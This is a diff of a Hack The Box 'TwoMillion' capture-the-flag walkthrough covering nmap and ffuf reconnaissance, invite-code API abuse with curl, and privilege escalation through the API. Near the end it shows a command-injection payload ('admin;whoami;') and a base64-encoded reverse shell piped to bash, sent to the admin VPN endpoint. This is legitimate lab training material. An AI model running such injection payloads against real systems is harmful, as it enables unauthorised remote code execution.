@@ -7,10 +7,10 @@ date: 2026-06-18
 ## MY MAIN IDEA AND WALKTHROUGH:
 1. First of all, we need to connect with the VPN from HTB, using the command: ```sudo openvpn <FILE_NAME>.ovpn```
 
-2. OK! now check the HTB website and get the target IP and we are ready to startttt: 
+1. OK! now check the HTB website and get the target IP and we are ready to startttt: 
    ![alt text](images/pic0.png)
 
-3. My first step is using `nmap` to scan generally the IP address:
+1. My first step is using `nmap` to scan generally the IP address:
 
 ```bash
 nmap --open <IP_ADDRESS>
@@ -29,8 +29,8 @@ The scan result shows us there are two active ports: 22 (`ssh` port), 80 (`http`
 4. My next step is checking the website of the given IP address and gain the url of the website:
    ![alt text](images/pic.png)
 
-5. I tried to fuzzing the website directories and vhosts using `ffuf` tool but I could not see anything helpful.
-6. When I checked the website more carefully, I saw this page:
+1. I tried to fuzzing the website directories and vhosts using `ffuf` tool but I could not see anything helpful.
+2. When I checked the website more carefully, I saw this page:
    ![alt text](images/pic1.png)
    In this page, I had to type the correct invite code to make new account. In this pic, I opened `Inspect` tab (You can open this tab by hit `Ctr+Shift+I`) and I reloaded the page and noticed the `inviteapi.min.js` file. There was the code in this file:
 
@@ -73,7 +73,7 @@ function makeInviteCode()
 ```
 
 7. The readable code showed us one important detail: when we `POST` data to the url: `'/api/v1/invite/how/to/generate` we will know how to get the correct invite code.
-8. My next approach is using `curl` tool to `POST` the data to the url:
+1. My next approach is using `curl` tool to `POST` the data to the url:
 
 ```bash
 curl http://2million.htb/api/v1/invite/how/to/generate -X POST -i
@@ -125,7 +125,7 @@ echo "<CODE>" |base64 -d
 9. After creating my account, I can access the `/home` page.
  ![alt text](images/pic5.png)
 
-10.    Looked around, I noticed some interesting thing, especially in `/home/access` page, where allowed me to download the VPN collection pack file. Turned on the `Inpect` tab and clicked the download button, the `Inspect` tab showed that when the button was clicked, the page sent the `GET` request to the address: `http://2million.htb/api/v1/user/vpn/generate`. My approach idea in this case is: `/api/v1` is the place to make and return invite code, return VPN collection pack file so, maybe I could use `curl` and try to send various of request to `/api/v1` and see what happen.
+1.    Looked around, I noticed some interesting thing, especially in `/home/access` page, where allowed me to download the VPN collection pack file. Turned on the `Inpect` tab and clicked the download button, the `Inspect` tab showed that when the button was clicked, the page sent the `GET` request to the address: `http://2million.htb/api/v1/user/vpn/generate`. My approach idea in this case is: `/api/v1` is the place to make and return invite code, return VPN collection pack file so, maybe I could use `curl` and try to send various of request to `/api/v1` and see what happen.
     
 ```bash
 	curl http://2million.htb\/api\/v1 -v                                                                        
@@ -237,6 +237,7 @@ curl http://2million.htb/api/v1/admin/auth -H 'Cookie: PHPSESSID=<MY_COOKIE>' | 
 ```
 
 12.    I returned to `/api/v1/admin/vpn/generate` one more time and sent `POST` request to see the response. The response showed me that I could interact with `/api/v1/admin/vpn/generate` and generate the VPN for specific user. This means when I `POST` data, the API will bring it to backend server and after the handle process, backend server responses back to my computer. My next approach is using `command injection` technique:
+
 ```bash
 curl http://2million.htb/api/v1/admin/vpn/generate -H 'Cookie: PHPSESSID=<MY_COOKIE>' -X POST -d '{"username": "admin;whoami;"}' -H 'Content-Type: application/json'
 www-data
@@ -244,7 +245,7 @@ www-data
 
 The backend server response the output of `whoami` command is `www-data` which verifies that our `command injection` attack succesful. 
 
-13.    From the hint in previous step, I tried to inject `reverse shell` in the command but it return nothing. Maybe I should encode our reverse shell to bypass the security system of backend server. I tried to encode my reverse shell to `base64`:
+13. From the hint in previous step, I tried to inject `reverse shell` in the command but it return nothing. Maybe I should encode our reverse shell to bypass the security system of backend server. I tried to encode my reverse shell to `base64`:
 
 ```bash
 curl http://2million.htb/api/v1/admin/vpn/generate -H 'Cookie: PHPSESSID=<MY_COOKIE>' -X POST -d '{"username": "admin;echo '<BASE64_REVERSE_SHELL>'| base64 -d| bash;"}' -H 'Content-Type: application/json'
